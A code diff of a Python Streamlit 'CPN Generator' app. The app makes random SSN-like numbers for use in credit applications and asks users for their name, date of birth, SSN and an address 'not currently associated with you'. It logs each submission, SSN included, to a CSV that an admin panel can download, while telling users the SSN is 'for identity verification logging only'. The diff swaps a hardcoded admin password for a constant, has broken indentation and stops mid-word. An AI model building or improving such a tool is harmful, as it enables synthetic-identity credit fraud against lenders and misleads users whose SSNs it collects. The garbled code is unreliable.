@@ -12,7 +12,7 @@ def generate_random_cpn():
     while True:
         cpn = ''.join([str(random.randint(0, 9)) for _ in range(9)])
         if not re.match(r"^(000|666|9)", cpn):
-            return can
+            return cpn  # FIXED: typo was `return can`
 
 def is_valid_ssn(ssn):
     return bool(re.fullmatch(r"\d{3}-\d{2}-\d{4}", ssn))
@@ -28,8 +28,9 @@ st.sidebar.title("🔒 Admin Access")
 admin_mode = st.sidebar.checkbox("Login as Admin")
 
 if admin_mode:
-    password = st.sidebar.text_input("Block_Beater_909$", type="password")
-if password == "Block_Beater_909$":
+    password = st.sidebar.text_input("Enter admin password", type="password")
+
+    if password == ADMIN_PASSWORD:
         st.title("📋 Admin Dashboard – Submissions Log")
 
         if os.path.exists(LOG_FILE):
@@ -55,21 +56,11 @@ if password == "Block_Beater_909$":
 
             csv_data = filtered_df.to_csv(index=False).encode("utf-8")
             st.download_button("📥 Download Filtered Logs as CSV", data=csv_data, file_name="filtered_logs.csv", mime="text/csv")
-
-            if admin_mode:
-            password = st.sidebar.text_input("Enter admin password", type="password")
-
-    if password == ADMIN_PASSWORD:
-        st.title("📋 Admin Dashboard – Submissions Log")
-
-        if os.path.exists(LOG_FILE):
-            df = pd.read_csv(LOG_FILE)
-            st.success("Log loaded successfully.")
-            # ... filter logic here ...
         else:
             st.warning("No log file found yet.")
     else:
         st.error("Incorrect password.")
+
 else:
     st.title("🔐 CPN Generator")
     st.markdown("""
@@ -78,31 +69,4 @@ else:
     """)
 
     with st.form("cpn_form"):
-        name = st.text_input("Full Name")
-        dob = st.date_input("Date of Birth")
-        ssn = st.text_input("Your SSN (for identity verification logging only)", placeholder="123-45-6789")
-        address = st.text_area("Address not currently associated with you")
-
-        submit = st.form_submit_button("Generate Number")
-
-
-        if submit:
-            if not name or not address:
-                st.error("Please complete all fields.")
-            elif not is_valid_ssn(ssn):
-                st.error("Enter a valid SSN (format: XXX-XX-XXXX).")
-            else:
-                cpn = generate_random_cpn()
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-                log_submission({
-                    "Name": name,
-                    "DOB": dob.strftime("%Y-%m-%d"),
-                    "SSN": ssn,
-                    "Address": address,
-                    "GeneratedNumber": cpn,
-                    "Timestamp": timestamp
-                })
-
-                st.success(f"Your generated number: **{cpn}**")
-                st.info("This number is NOT linked to your SSN or identity. Use responsibly.")
+        nam
